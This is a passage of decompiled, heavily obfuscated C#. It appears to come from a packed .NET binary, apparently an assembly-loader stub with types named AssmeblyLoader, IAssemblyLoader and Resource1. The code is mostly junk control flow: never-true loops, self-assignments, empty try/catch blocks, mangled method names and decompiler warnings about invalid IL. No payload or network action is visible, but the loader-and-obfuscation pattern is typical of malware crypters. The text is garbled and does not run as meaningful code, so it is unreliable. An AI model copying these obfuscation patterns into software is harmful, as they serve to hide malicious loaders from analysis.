		else
		{
			while ((object)null != null)
			{
				do
				{
					_ = y.t(intPtr) is _003CModule_003E;
				}
				while (obj != null);
			}
		}
		if ((UIntPtr)T.h(null) == (UIntPtr)(nuint)0u)
		{
			_ = (h)T.h(array);
		}
		else
		{
			y = y;
		}
		try
		{
			while (true)
			{
				if (obj != null)
				{
					_ = y.t(intPtr) is AssmeblyLoader;
				}
				else if ((object)null == null)
				{
					break;
				}
			}
		}
		finally
		{
			try
			{
				_ = (_003CModule_003E)(object)F.A();
			}
			catch
			{
				num = default(UIntPtr);
				if (num == (UIntPtr)(nuint)0u)
				{
					_ = (CHOOSEFONTFLAGS)T.h(array);
				}
			}
			goto IL_055e;
		}
		IL_0125:
		try
		{
			num = default(UIntPtr);
			if (checked(num + num) == 0)
			{
				num = default(UIntPtr);
				if (num == 0)
				{
					object obj8 = y.t(intPtr);
					_ = y.t((IntPtr)((obj8 is IntPtr) ? obj8 : null)) is AssmeblyLoader;
				}
				else
				{
					h obj9 = (h)T.h(array);
					h = h;
					h = obj9;
				}
			}
		}
		catch
		{
			cHOOSEFONTFLAGS = default(CHOOSEFONTFLAGS);
		}
		try
		{
			if (num / (nuint)(UIntPtr)T.h(array) == 0)
			{
				Resource1 obj11 = (Resource1)(object)F.A();
				Resource1 resource = resource;
				resource = obj11;
			}
			else
			{
				h = h;
			}
		}
		catch
		{
			do
			{
				_ = (Resource1)(object)F.A();
			}
			while ((object)null != null);
		}
		_ = (IAssemblyLoader)(object)T.h(array);
		while ((object)F.A() != null)
		{
			assemblyLoader = assemblyLoader;
			assemblyLoader = null;
		}
		_ = y.t(intPtr) is T;
		do
		{
			cHOOSEFONTFLAGS = cHOOSEFONTFLAGS;
		}
		while ((object)null != null || (object)null != null || (object)F.A() != null);
		try
		{
			if ((UIntPtr)T.h(array) == (UIntPtr)(nuint)0u)
			{
				F f = (F)(object)T.h(array);
			}
		}
		catch
		{
			do
			{
				_ = (T)(object)F.A();
			}
			while ((object)T.h(array) != null);
		}
		try
		{
			try
			{
				if (!(y.t(default(IntPtr)) is UIntPtr))
				{
					_ = (T)(object)F.A();
					T t = null;
					t = t;
					CHOOSEFONT cHOOSEFONT = (CHOOSEFONT)F.A();
					cHOOSEFONT = default(CHOOSEFONT);
					r r = r;
					r = r;
				}
				else
				{
					_ = (h)T.h(array);
				}
			}
			finally
			{
				object obj14 = y.t((IntPtr)F.A());
				_ = y.t((IntPtr)((obj14 is IntPtr) ? obj14 : null)) is IAssemblyLoader;
				_ = (r)F.A();
				goto end_IL_02c4;
			}
			end_IL_02c4:;
		}
		finally
		{
			if (num == 0)
			{
				while ((object)null != null)
				{
					_ = (_003CPrivateImplementationDetails_003E)(object)F.A();
				}
			}
			goto IL_039e;
		}
	}

	static void _003E_0025_0021_003A_005D_0040_0024_0028_003E__007C_003A18()
	{
		//IL_0049: Expected O, but got I4
		//IL_0081: Expected O, but got I4
		//IL_00b9: Expected O, but got I4
		//IL_00ee: Expected O, but got I4
		//IL_01a9: Expected O, but got I4
		//IL_01bc: Expected O, but got I4
		//IL_0217: Expected O, but got I4
		//IL_0299: Expected O, but got I4
		//IL_032b: Expected O, but got I4
		//IL_035a: Expected O, but got I4
		//IL_0372: Expected O, but got I4
		//IL_041f: Expected O, but got I4
		//IL_050f: Expected O, but got I4
		//IL_0528: Expected O, but got I4
		//IL_053a: Unknown result type (might be due to invalid IL or missing references)
		//IL_053f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_0541: Unknown result type (might be due to invalid IL or missing references)
		//IL_0542: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Unknown result type (might be due to invalid IL or missing references)
		//IL_0552: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e2: Expected O, but got I4
		//IL_0612: Expected O, but got I4
		CHOOSEFONTFLAGS num = (CHOOSEFONTFLAGS)F.A();
		CHOOSEFONTFLAGS cHOOSEFONTFLAGS = default(CHOOSEFONTFLAGS);
		cHOOSEFONTFLAGS = num;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nint num2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _003CPrivateImplementationDetails_003E _003CPrivateImplementationDetails_003E);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] array);
		try
		{
			try
			{
				do
				{
					num2 = default(IntPtr);
					num2 = num2;
					num2 = default(IntPtr);
					_ = y.t(num2) is h;
				}
				while ((object)null != null);
			}
			catch
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Resource1 resource);
				while (true)
				{
					obj = obj;
					if (obj != null)
					{
						Resource1 obj2 = (Resource1)(object)F.A();
						resource = resource;
						resource = obj2;
						_ = y.t(num2) is y;
						_003CPrivateImplementationDetails_003E = (_003CPrivateImplementationDetails_003E)(object)T.h(null);
						_003CPrivateImplementationDetails_003E = _003CPrivateImplementationDetails_003E;
						array = array;
						_ = y.t((IntPtr)T.h(array)) is IAssemblyLoader;
						continue;
					}
					break;
				}
			}
		}
		catch
		{
			do
			{
				num2 = default(IntPtr);
				_ = y.t(num2) is y;
			}
			while (obj != null);
		}
		_ = (F)(object)F.A();
		UIntPtr uIntPtr = default(UIntPtr);
		uIntPtr = default(UIntPtr);
		if (uIntPtr == 0)
		{
			_ = (y)(object)F.A();
		}
		else
		{
			_ = (CHOOSEFONT)F.A();
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out r r);
		while (obj != null)
		{
			if ((UIntPtr)T.h(array) == (UIntPtr)(nuint)0u)
			{
				uIntPtr = default(UIntPtr);
				if (uIntPtr == 0)
				{
					r = default(r);
				}
			}
		}
		object obj5 = y.t(num2);
		object obj6 = ((obj5 is CHOOSEFONT) ? obj5 : null);
		object obj7 = y.t((nint)checked(unchecked((nuint)num2) * unchecked((nuint)num2)));
		CHOOSEFONT cHOOSEFONT = (CHOOSEFONT)((obj7 is CHOOSEFONT) ? obj7 : null);
		cHOOSEFONT = (CHOOSEFONT)obj6;
		IAssemblyLoader assemblyLoader = null;
		assemblyLoader = assemblyLoader;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _003CModule_003E _003CModule_003E);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out T t);
		try
		{
			do
			{
				_ = (y)(object)F.A();
				_003CModule_003E = (_003CModule_003E)(object)T.h(T.h(array));
				_003CModule_003E = null;
				num2 = default(IntPtr);
				object obj8 = y.t(num2);
				cHOOSEFONT = (CHOOSEFONT)((obj8 is CHOOSEFONT) ? obj8 : null);
				cHOOSEFONTFLAGS = default(CHOOSEFONTFLAGS);
			}
			while (obj != null);
		}
		catch
		{
			if (uIntPtr == 0)
			{
				try
				{
					_ = (_003CPrivateImplementationDetails_003E)(object)F.A();
				}
				finally
				{
					_ = (_003CModule_003E)(object)F.A();
					goto end_IL_0240;
				}
			}
			Resource1 resource = (Resource1)(object)T.h(null);
			t = t;
			t = t;
			AssmeblyLoader assmeblyLoader = y.t(num2) as AssmeblyLoader;
			assmeblyLoader = assmeblyLoader;
			_ = (CHOOSEFONTFLAGS)F.A();
			end_IL_0240:;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out F f);
		if (uIntPtr == 0)
		{
			try
			{
				_ = (AssmeblyLoader)(object)F.A();
				_ = (_003CModule_003E)(object)F.A();
				IntPtr num3 = (IntPtr)T.h(T.h(null));
				num2 = default(IntPtr);
				nuint num4 = (nuint)num2 / (nuint)(nint)(IntPtr)T.h(array);
				num2 = default(IntPtr);
				_ = y.t((nint)checked(unchecked((nuint)(nint)num3) - ((num4 - unchecked((nuint)num2)) * unchecked((nuint)num2) - unchecked((nuint)num2)))) is Resource1;
			}
			catch
			{
				_ = (T)(object)F.A();
				_ = (r)T.h(array);
				F obj10 = y.t(num2) as F;
				f = (F)(object)T.h(y.t((IntPtr)T.h(array)) as byte[]);
				f = obj10;
			}
			finally
			{
				uIntPtr = default(UIntPtr);
				if (uIntPtr == 0)
				{
					r = r;
				}
				goto IL_03fb;
			}
		}
		goto IL_03fb;
		IL_03fb:
		while (obj != null)
		{
			if (uIntPtr == 0)
			{
				if ((UIntPtr)F.A() == (UIntPtr)(nuint)0u)
				{
					_ = (r)F.A();
				}
				else
				{
					_ = (F)(object)F.A();
				}
			}
			else
			{
				_003CModule_003E = _003CModule_003E;
			}
		}
		do
		{
			_003CModule_003E = null;
		}
		while (obj != null);
		object obj12 = y.t(num2);
		r = (r)((obj12 is r) ? obj12 : null);
		while (obj != null)
		{
			_ = (F)(object)T.h(array);
		}
		while ((object)F.A() != null)
		{
			try
			{
				_ = (_003CModule_003E)(object)T.h(null);
			}
			finally
			{
				_ = (F)(object)F.A();
				continue;
			}
		}
		while (obj != null)
		{
			while (true)
			{
				if ((object)F.A() != null)
				{
					_ = (r)T.h(null);
				}
				else if (obj == null)
				{
					break;
				}
			}
		}
		t = null;
		if (uIntPtr == 0)
		{
			try
			{
				do
				{
					_ = (IAssemblyLoader)(object)F.A();
				}
				while (obj != null);
			}
			catch
			{
				nuint intPtr = uIntPtr;
				object obj13 = y.t(num2);
				object obj14 = ((obj13 is UIntPtr) ? obj13 : null);
				object obj15 = y.t((nint)checked(unchecked((nuint)(nint)(IntPtr)F.A()) + unchecked((nuint)num2)));
				object obj16 = ((obj15 is UIntPtr) ? obj15 : null);
				uIntPtr = default(UIntPtr);
				_003F val;
				checked
				{
					val = intPtr * unchecked(unchecked((nuint)default(UIntPtr)) / checked(unchecked((nuint)default(UIntPtr)) + obj14 * (unchecked(obj16 / (nuint)uIntPtr) - unchecked((nuint)uIntPtr))));
					uIntPtr = default(UIntPtr);
				}
				if ((int)checked(val + uIntPtr) == 0)
				{
					r = default(r);
				}
			}
		}
		else
		{
			do
			{
				try
				{
					assemblyLoader = assemblyLoader;
				}
				catch
				{
					f = f;
				}
			}
			while ((object)T.h(array) != null);
		}
		do
		{
			_003CPrivateImplementationDetails_003E = _003CPrivateImplementationDetails_003E;
		}
		while ((object)null != null);
		while ((object)null != null)
		{
			do
			{
				if (checked(uIntPtr + uIntPtr * uIntPtr) == 0)
				{
					num2 = default(IntPtr);
					t = y.t(num2) as T;
				}
			}
			while ((object)null != null);
		}
		if (uIntPtr == 0)
		{
			while ((object)T.h(null) != null)
			{
				_ = y.t(num2) is h;
			}
		}
		else
		{
			_ = (CHOOSEFONT)T.h(array);
		}
		while ((object)null != null)
		{
			try
			{
				_ = (y)(object)T.h(F.A());
			}
			catch
			{
				assemblyLoader = assemblyLoader;
				_ = (AssmeblyLoader)(object)F.A();
				_ = (h)F.A();
				_ = (CHOOSEFONTFLAGS)T.h(T.h(F.A()));
			}
		}
	}

	static void _005B_0025_0040_0024_007C_0021_0024_005B_007D_005E_007C_003A20()
	{
		//IL_007d: Expected O, but got I4
		//IL_008c: Expected O, but got I4
		//IL_0109: Expected O, but got I4
		//IL_010d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected I, but got Unknown
		//IL_0130: Expected O, but got I4
		//IL_0167: Expected O, but got I4
		//IL_021d: Expected O, but got I4
		//IL_024c: Expected O, but got I4
		//IL_028b: Expected O, but got I4
		//IL_02ae: Expected O, but got I4
		//IL_0304: Expected O, but got I4
		//IL_0349: Expected O, but got I4
		//IL_03de: Expected O, but got I4
		//IL_03e7: Expected I, but got O
		//IL_03e8: Expected O, but got I4
		//IL_0419: Expected O, but got I4
		//IL_04a0: Expected O, but got I4
		//IL_04ec: Expected O, but got I4
		//IL_0538: Expected O, but got I4
		//IL_0570: Expected O, but got I4
		//IL_05df: Expected O, but got I4
		object obj;
		while (true)
		{
			obj = null;
			if (obj == null)
			{
				break;
			}
			_ = (_003CPrivateImplementationDetails_003E)(object)F.A();
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out h h);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out AssmeblyLoader assmeblyLoader);
		do
		{
			try
			{
				h = h;
				h = default(h);
				h = h;
			}
			catch
			{
				AssmeblyLoader obj2 = (AssmeblyLoader)(object)F.A();
				assmeblyLoader = assmeblyLoader;
				assmeblyLoader = obj2;
			}
		}
		while (obj != null);
		IntPtr intPtr = (IntPtr)F.A();
		_ = y.t(intPtr) is T;
		byte[] array = y.t(intPtr) as byte[];
		UIntPtr uIntPtr = (UIntPtr)T.h(array);
		if (uIntPtr == (UIntPtr)(nuint)0u)
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out F f);
			do
			{
				if (uIntPtr == (UIntPtr)(nuint)0u)
				{
					f = f;
					f = null;
				}
			}
			while ((object)T.h(null) != null);
		}
		assmeblyLoader = (AssmeblyLoader)(object)T.h(F.A());
		intPtr = default(IntPtr);
		nint num = intPtr;
		object obj4 = y.t(intPtr);
		_ = (Resource1)(object)T.h(y.t((nint)(checked(num * ((obj4 is IntPtr) ? obj4 : null) + intPtr) / ((nuint)(nint)(IntPtr)F.A() / (nuint)(nint)(IntPtr)T.h(null)))) as byte[]);
		if (default(UIntPtr) == (UIntPtr)(nuint)0u)
		{
			_003CPrivateImplementationDetails_003E _003CPrivateImplementationDetails_003E = (_003CPrivateImplementationDetails_003E)(object)T.h(y.t((IntPtr)T.h(array)) as byte[]);
			_003CPrivateImplementationDetails_003E = null;
		}
		else
		{
			y y = y;
			y = y;
		}
		while (true)
		{
			if ((object)null != null)
			{
				do
				{
					_ = (y)(object)F.A();
				}
				while ((object)null != null);
			}
			else if ((object)T.h(array) == null)
			{
				break;
			}
		}
		try
		{
			_ = (CHOOSEFONTFLAGS)T.h(T.h(null));
			nuint num2;
			nint num3;
			checked
			{
				num2 = unchecked((nuint)intPtr) - (unchecked((nuint)intPtr) - (unchecked((nuint)intPtr) + unchecked((nuint)intPtr)) - unchecked((nuint)intPtr));
				intPtr = default(IntPtr);
				num3 = intPtr;
				intPtr = default(IntPtr);
			}
			_ = y.t((nint)checked(num2 * unchecked((nuint)num3 / (nuint)intPtr))) is _003CModule_003E;
			_ = (_003CPrivateImplementationDetails_003E)(object)T.h(array);
		}
		catch
		{
			nuint num5;
			do
			{
				intPtr = default(IntPtr);
				Resource1 resource = y.t(intPtr) as Resource1;
				resource = resource;
				IntPtr num4 = (IntPtr)F.A();
				intPtr = default(IntPtr);
				checked
				{
					num5 = unchecked((nuint)(nint)num4) + unchecked((nuint)intPtr);
					intPtr = default(IntPtr);
				}
			}
			while (y.t((nint)checked(num5 + unchecked((nuint)intPtr))) is object);
		}
		finally
		{
			try
			{
				while (obj != null)
				{
					_ = (CHOOSEFONT)T.h(y.t(intPtr) as byte[]);
				}
			}
			catch
			{
				try
				{
					_ = (F)(object)T.h(null);
				}
				catch
				{
					_ = (T)(object)F.A();
					nint num6 = intPtr;
					intPtr = default(IntPtr);
					_ = y.t((nint)checked(unchecked((nuint)num6) + unchecked((nuint)intPtr))) is F;
					_ = (h)F.A();
				}
			}
			goto IL_031c;
		}
		IL_031c:
		try
		{
			try
			{
				nint num7 = intPtr;
				intPtr = default(IntPtr);
				object obj8 = y.t((nint)checked(unchecked((nuint)num7) + unchecked((nuint)intPtr) + (unchecked((nuint)(nint)(IntPtr)F.A()) + unchecked((nuint)intPtr))));
				object obj9 = ((obj8 is CHOOSEFONT) ? obj8 : null);
				CHOOSEFONT cHOOSEFONT = cHOOSEFONT;
				cHOOSEFONT = (CHOOSEFONT)obj9;
			}
			catch
			{
				h = default(h);
			}
		}
		catch
		{
			_ = (CHOOSEFONT)T.h(null);
		}
		finally
		{
			try
			{
				_ = (_003CPrivateImplementationDetails_003E)(object)F.A();
			}
			finally
			{
				while (obj != null)
				{
					_003CModule_003E _003CModule_003E = null;
					_003CModule_003E = _003CModule_003E;
					object obj12 = y.t((nint)checked(unchecked((nuint)(nint)(IntPtr)T.h(T.h(null))) + unchecked((nuint)unchecked((nint)default(IntPtr)))));
					_ = y.t((IntPtr)((obj12 is IntPtr) ? obj12 : null)) is _003CModule_003E;
					assmeblyLoader = assmeblyLoader;
				}
				goto IL_0404;
			}
		}
		IL_0404:
		_ = y.t(default(IntPtr)) is _003CPrivateImplementationDetails_003E;
		do
		{
			CHOOSEFONTFLAGS cHOOSEFONTFLAGS = (CHOOSEFONTFLAGS)T.h(array);
			cHOOSEFONTFLAGS = default(CHOOSEFONTFLAGS);
		}
		while ((object)F.A() != null);
		if (default(UIntPtr) == (UIntPtr)(nuint)0u)
		{
			try
			{
				try
				{
					_ = (AssmeblyLoader)(object)T.h(array);
				}
				finally
				{
					assmeblyLoader = assmeblyLoader;
					goto end_IL_0466;
				}
				end_IL_0466:;
			}
			finally
			{
				do
				{
					_ = y.t((IntPtr)T.h(null)) is T;
				}
				while (obj != null);
				goto IL_0523;
			}
		}
		while ((object)null != null)
		{
			if ((UIntPtr)F.A() == (UIntPtr)(nuint)0u)
			{
				_ = y.t((nint)checked(unchecked((nuint)unchecked((nint)default(IntPtr))) * unchecked((nuint)(nint)(IntPtr)F.A()))) is CHOOSEFONT;
				CHOOSEFONT cHOOSEFONT = default(CHOOSEFONT);
			}
			else
			{
				CHOOSEFONTFLAGS cHOOSEFONTFLAGS = default(CHOOSEFONTFLAGS);
			}
		}
		goto IL_0523;
		IL_0523:
		intPtr = default(IntPtr);
		if (!(y.t(intPtr) is UIntPtr))
		{
			do
			{
				_ = (IAssemblyLoader)(object)F.A();
				_ = (F)(object)F.A();
				T t = null;
				t = t;
			}
			while (y.t(intPtr) is object);
		}
		if (default(UIntPtr) == (UIntPtr)(nuint)0u)
		{
			F f = null;
		}
		else
		{
			while (obj != null)
			{
				T t = null;
			}
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out r r);
		while ((object)null != null)
		{
			while (y.t(intPtr) is object)
			{
				r = r;
				r = default(r);
			}
		}
	}
}
